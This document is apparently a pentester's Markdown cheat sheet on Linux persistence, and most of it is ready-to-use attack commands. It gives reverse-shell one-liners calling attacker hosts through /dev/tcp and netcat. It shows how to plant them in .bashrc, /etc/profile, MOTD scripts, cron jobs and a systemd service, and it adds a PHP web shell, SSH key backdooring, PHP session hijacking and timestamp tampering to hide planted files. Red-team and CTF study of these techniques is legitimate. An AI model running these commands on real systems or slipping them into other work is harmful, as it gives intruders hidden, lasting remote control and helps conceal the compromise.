# Linux Persistence

For general overview of persistance that OS neutral: [[Persistence]].

## Nohup

Use `nohup` - no hang up in a script to make call back.  
```bash
#!/bin/bash
while true; do
    nohup bash -i >& /dev/tcp/$ip/443 0>&1;
    sleep 10;
done
```


#### Ippsec Timestamp checking

Find all timestamps as [[Linux-Blueteam]], with touch cp the persistence mechanicism with `touch`
```bash
ls -lt --time-style=full-iso# Displys all timestamps
find / -type f -printf "%T+ %p\n" | grep -v 00000000
touch original_lib_file -r persistence_file
```

#### .rc Aliasing

```bash
# If have sudo or permission to propagate to all usersasdasd
echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /etc/profile
# consider .zshrc or dash.rc
echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /home/$USER/.bashrc 
```

#### MOTD you got pwned

```bash
# When anyone logs in 
echo "$reversehell_goes_here" | sudo tee -a /etc/update-motd.d/00-header
```



#### SSH Keys
It's not very hidden, easy to remove or detect. - https://attack.mitre.org/techniques/T1098/
```bash
# Generate on host; provide some fields
ssh-keygen  
# target machine:
# cat public key on host and echo it into .ssh/authorized_keys
mkdir .ssh
echo "ssh-rsa $base64fromkey" > .ssh/authorized_keys
chmod 600 id_rsa
```

#### php
web root /var/www/html
`touch shell.php` and add the below:
Or add within a file of this directory
Change the 'cmd' paramtre to something that LESS like to be called 
```php
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

#### stealing php session
```bash
/var/lib/php/sessions # defauilt locations
sess_<SESSION_ID> # set your PHPSESSID cookie to hijack
```
Session files and cookie name are configurable in php.ini:
```php
session.save_path
session.name
```

#### Cron
```bash
# newlines required
CT="\n1 * * * *   root    ./dev/shm/met.elf\n"
printf "$CT" | crontab -
```

Serve shell script, for example:
```bash
#!/bin/bash
bash -i >& /dev/tcp/ip/port 0>&1
```
.bashrc
```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```
OR pam_unix.so [pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

```bash
# Variable just for easy reading.
REVSHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 >/tmp/f"
(crontab -l ; echo "@reboot sleep 200 && $REVSHELL")|crontab 2> /dev/null
```

#### Systemd

[From this article Systemd persistence](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)
```bash
touch ~/.config/system/root/persistence.service
# Make p.service 
[Unit]  
Description=Just a reverse shell

[Service]  
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/8008 0>&1'  
Restart=always  
RestartSec=60

[Install]  
WantedBy=default.target
```

Enable and start service
```bash
systemctl --user enable persistence.service
systemctl --user start persistence.service 
# systemd --user only started on login
# Configure with root run:
loginctl enable-linger
# Check if already set:
/var/lib/systemd/linger/$username_is_here_if_enabled
```


## References

[Ippsec Rocks, youtube video](https://www.youtube.com//watch?v=yaV09XCDDqI&t=390s)
[9-ways-to-backdoor-a-linux-box](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c) -  Backdoors
[creating-backdoor-in-pam](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html) - pam unix backdoors
[linuxbackdoors](https://tryhackme.com/room/linuxbackdoors) - Backdoors
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Persistence.md)
[Mitre Persistence](https://attack.mitre.org/techniques/T1098)
[Alexey Petrenko's Systemd persistence](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)